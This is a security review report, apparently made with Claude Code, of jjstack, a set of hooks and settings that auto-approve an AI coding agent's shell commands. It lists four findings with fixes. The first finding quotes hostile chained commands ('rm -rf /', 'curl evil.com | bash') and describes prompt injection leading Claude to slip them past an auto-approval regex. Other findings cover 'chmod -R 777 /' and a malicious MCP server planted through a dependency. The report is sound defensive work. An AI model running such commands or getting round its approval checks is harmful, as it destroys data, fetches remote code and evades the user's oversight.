# Security Review — jjstack

**Date:** 2026-03-30
**Scope:** Git diff + full codebase CWE assessment
**Assessor:** Claude Code + jjstack /security-review v0.4.0
**Sources:** Anthropic security-review, Sentry security-review, OWASP Top 10:2025

## Summary

- **Critical:** 0 findings
- **High:** 0 findings
- **Medium:** 2 findings
- **Low:** 2 findings
- **Filtered:** 0 findings removed by false-positive verification

## Findings

### FINDING-001: Fallback regex bypass via command chaining
- **Severity:** Medium
- **Confidence:** 0.9
- **CWE:** CWE-78 — OS Command Injection
- **OWASP:** A05 — Injection
- **Location:** `hooks/auto-approve-safe.sh:52-53` (and duplicated at lines 91-92)
- **Description:** The `SAFE_READONLY` regex checks only that a command *starts with* a safe command (`^\s*(ls|cat|...)\b`). A chained command like `ls; rm -rf /` or `cat foo && curl evil.com | bash` would match (starts with `ls` or `cat`) and be auto-approved in the fallback path when the API is unavailable.
- **Exploit scenario:** If an attacker achieves prompt injection against Claude in a session where the Anthropic API key is missing or the API is down, Claude could be instructed to produce compound commands that bypass the fallback heuristic. The command would be auto-approved without user confirmation.
- **Evidence:**
  ```bash
  SAFE_READONLY='^\s*(ls|cat|head|tail|...)\b'
  echo "$COMMAND" | grep -qE "$SAFE_READONLY" && allow
  ```
- **Remediation:** Reject commands containing shell metacharacters (`;`, `&&`, `||`, `|`, backticks, `$()`) before checking the safe-command regex.
- **Status:** FIXED — Added metacharacter rejection before the regex check in both fallback paths.

### FINDING-002: API key file readable by other local users
- **Severity:** Medium
- **Confidence:** 0.95
- **CWE:** CWE-732 — Incorrect Permission Assignment for Critical Resource
- **OWASP:** A01 — Broken Access Control
- **Location:** `hooks/auto-approve-safe.sh:47` (reads `~/.claude/anthropic_api_key`)
- **Description:** The file `~/.claude/anthropic_api_key` is referenced as a fallback API key source. If created with default permissions (`644`), any local user or process can read the Anthropic API key. The hook script did not verify or enforce file permissions.
- **Exploit scenario:** On a shared system or compromised workstation, a local attacker reads the API key file and uses it to make unauthorized API calls billed to the victim's account.
- **Evidence:**
  ```bash
  API_KEY=$(cat "$HOME/.claude/anthropic_api_key" 2>/dev/null | tr -d '[:space:]')
  ```
- **Remediation:** Check file permissions before reading; auto-fix to `600` if too permissive.
- **Status:** FIXED — Added permissions check and auto-chmod to 600.

### FINDING-003: Overly broad `Bash(chmod:*)` allow rule in project settings
- **Severity:** Low
- **Confidence:** 0.85
- **CWE:** CWE-732 — Incorrect Permission Assignment for Critical Resource
- **OWASP:** A01 — Broken Access Control
- **Location:** `.claude/settings.local.json:6`
- **Description:** The project-level settings auto-approve any `chmod` command, including dangerous patterns like `chmod 777` or `chmod -R 777 /`. This overrides the global `ask` rules for dangerous chmod operations within this project.
- **Exploit scenario:** Prompt injection could cause Claude to `chmod 777` sensitive files, which would be auto-approved.
- **Evidence:**
  ```json
  "Bash(chmod:*)"
  ```
- **Remediation:** Narrow to `"Bash(chmod +x *)"` or remove and let global `ask` rules handle it.
- **Status:** NOT FIXED — Requires manual review of which chmod patterns are needed for this project.

### FINDING-004: `enableAllProjectMcpServers: true` in project settings
- **Severity:** Low
- **Confidence:** 0.8
- **CWE:** CWE-829 — Inclusion of Functionality from Untrusted Control Sphere
- **OWASP:** A08 — Software and Data Integrity Failures
- **Location:** `.claude/settings.local.json:15`
- **Description:** This flag auto-enables any MCP server defined in `.mcp.json` files found in the project tree. If a cloned dependency (gstack, Sentry skills, etc.) contained a malicious `.mcp.json`, its MCP server would be auto-enabled without user approval.
- **Exploit scenario:** A supply chain attack on a dependency repo adds a `.mcp.json` with a malicious MCP server. On the next `./setup` run, the repo is cloned into `~/.claude/skills/`, and the MCP server is auto-enabled in this project.
- **Evidence:**
  ```json
  "enableAllProjectMcpServers": true
  ```
- **Remediation:** Replace with explicit `enabledMcpjsonServers` entries for trusted servers only.
- **Status:** NOT FIXED — Low severity, requires review of which MCP servers are needed.

## STRIDE Threat Summary

| Category | Findings | Key risks |
|----------|----------|-----------|
| **S** — Spoofing | 0 | No findings |
| **T** — Tampering | 1 | FINDING-004: untrusted MCP server auto-enablement |
| **R** — Repudiation | 0 | No findings |
| **I** — Information Disclosure | 1 | FINDING-002: API key file permissions |
| **D** — Denial of Service | 0 | No findings |
| **E** — Elevation of Privilege | 2 | FINDING-001: command chaining bypass; FINDING-003: broad chmod allow |

**Uncovered categories:** Spoofing (S), Repudiation (R), Denial of Service (D) — these are blind spots but expected for a local CLI tool that doesn't serve network traffic or handle user authentication.

## Verified Safe (Non-Findings)

| Check | Result |
|-------|--------|
| Secret detection (14 patterns) | Clean — no hardcoded secrets in code or git history |
| Supply chain | No code dependencies; setup clones from trusted GitHub orgs |
| Cryptographic algorithms | No crypto operations in codebase |
| Security headers | No HTTP servers; not applicable |
| Setup temp files | Uses `mktemp` everywhere; no predictable paths |
| JSON construction | Uses `jq -n --arg` for safe escaping; no injection |
| Uninstall script | Validates symlink targets before removing |
| CLAUDE.md instructions | Contains only formatting/workflow preferences; nothing security-weakening |
| mcp-reconnect counter | Uses `~/.jjstack/` (user-specific); not world-writable `/tmp/` |
| Fail-closed design | Hook defaults to `defer` (ask user) on API failure |
